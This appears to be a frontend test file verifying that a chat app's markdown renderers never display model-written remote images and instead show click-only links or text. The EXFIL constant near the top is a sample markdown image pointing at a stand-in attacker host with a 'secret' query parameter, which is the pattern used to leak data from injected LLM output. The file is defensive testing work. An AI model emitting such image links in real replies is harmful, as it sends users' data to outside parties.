import { describe, expect, it } from 'vitest';
import React from 'react';
import { render } from '@testing-library/react';
import { ChatMarkdown } from '@/components/chat/ChatMarkdown';
import { AgentMarkdownRenderer } from '@/components/agent-chat/AgentMarkdownRenderer';
import { MarkdownRenderer } from '@/components/llm-chat/MarkdownRenderer';
import { SafeMarkdownImage } from '../SafeMarkdownImage';

const EXFIL = 'Answer. ![chart](https://attacker.example/x.png?q=secret)';

describe('SafeMarkdownImage', () => {
  it('renders a click-only link for an http(s) image', () => {
    const { container } = render(
      <SafeMarkdownImage src="https://a.example/i.png?q=1" alt="chart" />
    );
    expect(container.querySelector('img')).toBeNull();
    const link = container.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://a.example/i.png?q=1');
    expect(link?.getAttribute('rel')).toContain('noopener');
    expect(link?.textContent).toBe('[image: chart]');
  });

  it.each(['/api/v1/documents/1', 'data:image/png;base64,AAAA', undefined])(
    'renders text only for %s',
    (src) => {
      const { container } = render(<SafeMarkdownImage src={src} alt="" />);
      expect(container.querySelector('img')).toBeNull();
      expect(container.querySelector('a')).toBeNull();
      expect(container.textContent).toBe('[image]');
    }
  );
});

describe.each([
  ['ChatMarkdown', () => <ChatMarkdown content={EXFIL} />],
  ['ChatMarkdown inline', () => <ChatMarkdown content={EXFIL} inline />],
  [
    'ChatMarkdown math path',
    () => <ChatMarkdown content={`${EXFIL} and $x^2$`} />,
  ],
  ['AgentMarkdownRenderer', () => <AgentMarkdownRenderer content={EXFIL} />],
  [
    'AgentMarkdownRenderer with citations',
    () => (
      <AgentMarkdownRenderer
        content={`${EXFIL} [1]`}
        citations={[
          { documentId: 'd1', documentTitle: 'Doc', snippet: 's', score: 1 },
        ]}
      />
    ),
  ],
  ['llm-chat MarkdownRenderer', () => <MarkdownRenderer content={EXFIL} />],
])('%s', (_name, el) => {
  it('never renders a model-written remote <img>', async () => {
    const { container, findByText } = render(el());
    // Wait for lazy paths (the math chunk) to settle before asserting.
    await findByText(/Answer/);
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('src="https://attacker');
  });
});
